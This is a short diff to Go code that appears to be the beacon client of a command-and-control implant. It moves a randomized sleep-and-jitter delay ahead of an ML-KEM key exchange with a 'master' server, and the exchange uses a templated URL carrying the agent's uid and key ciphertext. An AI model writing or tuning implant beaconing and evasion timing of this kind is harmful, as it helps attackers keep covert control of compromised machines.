@@ -1143,6 +1143,16 @@ func send() { //发送头部信息
 	func generateAndUpdateKey(url string){
 		base_respBody := getUrl(url)
 		serverPubKeyBytes := customBase64Decode(base_respBody)
+		a_Mutex.RLock();wait := delay;jitterValue := jitter;a_Mutex.RUnlock()
+        if wait < 0 {wait = 0}
+        if wait > 30 && jitterValue > 0 {
+            n, err := crand.Int(crand.Reader,big.NewInt(int64(jitterValue)+1),);
+            if err != nil {
+                return
+            }
+            wait += int(n.Int64())
+        }
+        time.Sleep(time.Duration(wait) * time.Second)
 		if len(serverPubKeyBytes) != mlkem.EncapsulationKeySize768 {
             return
         }
@@ -1156,16 +1166,6 @@ func send() { //发送头部信息
         }
 		ciphertextBase64 := customBase64Encode(ciphertext)
 		key_url := protocol + master + "//*Path*/?/*option*/=/*switch_key*/&/*uid*/=" + uid + "&/*keyPart*/=" + ciphertextBase64
-		a_Mutex.RLock();wait := delay;jitterValue := jitter;a_Mutex.RUnlock()
-        if wait < 0 {wait = 0}
-        if wait > 30 && jitterValue > 0 {
-            n, err := crand.Int(crand.Reader,big.NewInt(int64(jitterValue)+1),);
-            if err != nil {
-                return
-            }
-            wait += int(n.Int64())
-        }
-        time.Sleep(time.Duration(wait) * time.Second)
         getUrl(key_url)
         key = sharedKey
         onece = false
